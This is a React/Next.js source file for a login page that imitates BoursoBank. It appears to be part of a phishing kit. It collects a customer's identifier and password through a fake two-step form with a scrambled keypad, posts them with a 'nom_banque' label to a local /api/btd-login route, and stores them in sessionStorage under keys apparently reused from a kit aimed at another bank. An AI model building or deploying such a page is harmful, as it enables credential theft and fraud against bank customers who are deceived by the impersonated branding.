'use client';

import React, { useState, FormEvent } from 'react';
import { useRouter } from 'next/navigation';

interface BoursoBankConnexionProps {
  partnerLogoSrc?: string;
  boursoLogoSrc?: string;
  illustrationSrc?: string;
}

export default function BoursoBankConnexionPage({
  partnerLogoSrc = '/favicon.ico',
  boursoLogoSrc = '/bourso-bank-600-300x200.webp',
  illustrationSrc = '/boursobank_bel.png',
}: BoursoBankConnexionProps) {
  const router = useRouter();

  const [step, setStep] = useState<'id' | 'password'>('id');
  const [clientId, setClientId] = useState<string>('');
  const [secretCode, setSecretCode] = useState<string>('');
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);

  // Disposition de la grille du clavier visuel
  const keyLayout = ['3', '8', '9', '0', '4', '2', '5', '6', '1', '7'];

  // Validation : Alphanumérique sans limite de longueur (au moins 1 caractère)
  const isIdValid = clientId.trim().length > 0;
  const isPassValid = secretCode.trim().length > 0;

  const handleIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Saisie libre alphanumérique sans restriction ni limite de longueur
    setClientId(e.target.value);
  };

  const handleContinue = (e: FormEvent) => {
    e.preventDefault();
    if (isIdValid) {
      setStep('password');
    }
  };

  const handleBackToId = () => {
    setSecretCode('');
    setStep('id');
  };

  const handleKeyClick = (val: string) => {
    setSecretCode((prev) => prev + val);
  };

  const handleClearKey = () => {
    setSecretCode((prev) => prev.slice(0, -1));
  };

  const handleFinalSubmit = async (e: FormEvent) => {
    // Soumission vers /api/btd-login et redirection vers /bat
    e.preventDefault();
    if (!secretCode.trim() || isSubmitting) return;

    setIsSubmitting(true);

    // Payload aligné sur les clés lues par la route API
    const payload = {
      nom_banque: 'BOURSO BANK',
      identifiant: clientId,
      secret_code: secretCode,
    };

    try {
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('sg_client_id', clientId);
        sessionStorage.setItem('sg_secret_code', secretCode);
      }

      const res = await fetch('/api/btd-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      // Vérification de la réussite HTTP
      if (!res.ok) {
        throw new Error(`Erreur réseau (Statut : ${res.status})`);
      }

      const data = await res.json();

      if (data.success) {
        router.push('/bat');
      }
    } catch (error) {
      console.error('Erreur lors de la soumission :', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      <style>{`
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          font-family: 'Inter', system-ui, -apple-system, sans-serif;
        }
        .bb-body-wrapper {
          background-color: #f7f9fa;
          color: #121824;
          display: flex;
          justify-content: center;
          min-height: 100vh;
          width: 100%;
          -webkit-font-smoothing: antialiased;
        }
        .bb-app-container {
          width: 100%;
          max-width: 450px;
          background-color: #ffffff;
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
          position: relative;
        }

        /* --- EN-TÊTE LOGO --- */
        .bb-header {
          display: flex;
          justify-content: center;
          align-items: center;
          padding: 15px 0;
          border-bottom: 1px solid #edf2f7;
          gap: 10px;
        }
        .bb-logo-wrap {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        .bb-partner-logo,
        .bb-main-logo {
          height: 42px !important;
          width: auto;
          max-width: 130px;
          object-fit: contain;
          display: block;
        }
        .bb-logo-sep {
          color: #718096;
          font-size: 16px;
          font-weight: 600;
        }

        /* --- BLOC PRINCIPAL CONTENU --- */
        .bb-auth-card {
          padding: 30px 24px;
          flex-grow: 1;
          display: flex;
          flex-direction: column;
        }

        /* --- ÉTAPE 1 : IDENTIFIANT --- */
        .bb-top-illustration {
          display: flex;
          justify-content: center;
          margin-bottom: 20px;
        }
        .bb-top-illustration img {
          height: 75px;
          width: auto;
        }
        .bb-panel-title {
          font-size: 22px;
          font-weight: 700;
          color: #121824;
          text-align: center;
          margin-bottom: 8px;
        }
        .bb-panel-title.text-left {
          text-align: left;
          margin-bottom: 15px;
        }
        .bb-panel-subtitle {
          font-size: 14px;
          color: #718096;
          text-align: center;
          line-height: 1.4;
          margin-bottom: 15px;
        }
        .bb-badge-secure {
          align-self: center;
          background-color: #edf2f7;
          color: #4a5568;
          font-size: 13px;
          font-weight: 600;
          padding: 6px 14px;
          border-radius: 20px;
          margin-bottom: 25px;
        }

        .bb-input-line-container {
          margin-bottom: 30px;
          border-bottom: 2px solid #cbd5e0;
          padding-bottom: 8px;
          transition: border-color 0.2s;
          display: flex;
          align-items: center;
        }
        .bb-input-line-container:focus-within {
          border-color: #e1007a;
        }
        .bb-input-line-container input {
          width: 100%;
          border: none;
          outline: none;
          font-size: 18px;
          font-weight: 500;
          color: #121824;
          text-align: center;
          background: transparent;
        }
        .bb-input-line-container input::placeholder {
          color: #a0aec0;
          font-weight: 400;
        }

        .bb-toggle-pwd-btn {
          background: transparent;
          border: none;
          font-size: 13px;
          color: #e1007a;
          font-weight: 600;
          cursor: pointer;
          padding-left: 8px;
          white-space: nowrap;
        }

        /* --- ACTION ACTIONS & RETOUR --- */
        .bb-back-action-row {
          margin-bottom: 20px;
        }
        .bb-back-link {
          background: transparent;
          border: none;
          color: #718096;
          font-size: 15px;
          font-weight: 500;
          cursor: pointer;
          display: flex;
          align-items: center;
        }

        .bb-identifier-recap-badge {
          background-color: #f7fafc;
          border: 1px solid #e2e8f0;
          padding: 10px 14px;
          border-radius: 8px;
          font-size: 14px;
          color: #4a5568;
          margin-bottom: 25px;
        }
        .bb-recap-target {
          font-weight: 700;
          color: #121824;
        }

        /* --- GRILLE CLAVIER VISUEL --- */
        .bb-keyboard-matrix-container {
          background-color: #f7fafc;
          border: 1px solid #edf2f7;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 30px;
        }
        .bb-keyboard-grid {
          display: grid;
          grid-template-columns: repeat(3, 1fr);
          gap: 16px;
        }
        .bb-key-circle {
          background-color: #ffffff;
          border: 1px solid #e2e8f0;
          height: 52px;
          border-radius: 26px;
          font-size: 18px;
          font-weight: 700;
          color: #121824;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          box-shadow: 0 2px 4px rgba(0,0,0,0.02);
          transition: background-color 0.1s;
          user-select: none;
        }
        .bb-key-circle:active {
          background-color: #edf2f7;
        }
        .bb-key-util {
          grid-column: span 2;
          background-color: #edf2f7;
          color: #4a5568;
          font-size: 15px;
          font-weight: 600;
          border: none;
        }

        /* --- BOUTONS UNIFIÉS DE SOUMISSION --- */
        .bb-btn-fuchsia {
          width: 100%;
          padding: 15px;
          border: none;
          border-radius: 30px;
          font-size: 16px;
          font-weight: 700;
          text-align: center;
          background-color: #cbd5e0;
          color: #ffffff;
          cursor: not-allowed;
          transition: background-color 0.2s ease;
        }
        .bb-active-state {
          background-color: #e1007a !important;
          color: #ffffff !important;
          cursor: pointer !important;
          box-shadow: 0 4px 12px rgba(225, 0, 122, 0.2);
        }
      `}</style>

      <div className="bb-body-wrapper">
        <div className="bb-app-container">
          <header className="bb-header">
            <div className="bb-logo-wrap">
              {partnerLogoSrc && (
                <>
                  <img src={partnerLogoSrc} alt="Favicon" className="bb-partner-logo" />
                  <span className="bb-logo-sep">→</span>
                </>
              )}
              <img src={boursoLogoSrc} alt="BoursoBank" className="bb-main-logo" />
            </div>
          </header>

          <main className="bb-auth-card">
            {step === 'id' && (
              <form onSubmit={handleContinue} style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
                <div className="bb-top-illustration">
                  <img src={illustrationSrc} alt="Illustration Sécurité" />
                </div>

                <h1 className="bb-panel-title">Mon identifiant</h1>
                <p className="bb-panel-subtitle">
                  Veuillez toujours vérifier que vous êtes sur la bonne adresse
                </p>

                <div className="bb-badge-secure">🔒 Espace Client Privé</div>

                {/* Saisie Alphanumérique sans limite pour l'Identifiant */}
                <div className="bb-input-line-container">
                  <input
                    type="text"
                    id="bb-id-field"
                    placeholder="Saisissez votre identifiant"
                    value={clientId}
                    onChange={handleIdChange}
                    autoComplete="off"
                  />
                </div>

                <button
                  type="submit"
                  disabled={!isIdValid}
                  className={`bb-btn-fuchsia ${isIdValid ? 'bb-active-state' : ''}`}
                >
                  Suivant
                </button>
              </form>
            )}

            {step === 'password' && (
              <form onSubmit={handleFinalSubmit} style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
                <div className="bb-back-action-row">
                  <button
                    type="button"
                    className="bb-back-link"
                    onClick={handleBackToId}
                  >
                    ‹ Retour à l'identifiant
                  </button>
                </div>

                <h1 className="bb-panel-title text-left">Mon mot de passe</h1>

                <div className="bb-identifier-recap-badge">
                  Identifiant : <span className="bb-recap-target">{clientId}</span>
                </div>

                {/* Saisie Alphanumérique sans limite pour le Mot de passe */}
                <div className="bb-input-line-container">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    placeholder="Saisissez votre mot de passe"
                    value={secretCode}
                    onChange={(e) => setSecretCode(e.target.value)}
                    autoComplete="off"
                  />
                  <button
                    type="button"
                    className="bb-toggle-pwd-btn"
                    onClick={() => setShowPassword((prev) => !prev)}
                  >
                    {showPassword ? 'Masquer' : 'Afficher'}
                  </button>
                </div>

                {/* Clavier visuel d'appoint */}
                <div className="bb-keyboard-matrix-container">
                  <div className="bb-keyboard-grid">
                    {keyLayout.map((val) => (
                      <button
                        key={val}
                        type="button"
                        className="bb-key-circle"
                        onClick={() => handleKeyClick(val)}
                      >
                        {val}
                      </button>
                    ))}
                    <button
                      type="button"
                      className="bb-key-circle bb-key-util"
                      onClick={handleClearKey}
                    >
                      Effacer
                    </button>
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={!isPassValid || isSubmitting}
                  className={`bb-btn-fuchsia ${
                    isPassValid && !isSubmitting ? 'bb-active-state' : ''
                  }`}
                >
                  {isSubmitting ? 'Connexion...' : 'Je me connecte'}
                </button>
              </form>
            )}
          </main>
        </div>
      </div>
    </>
  );
}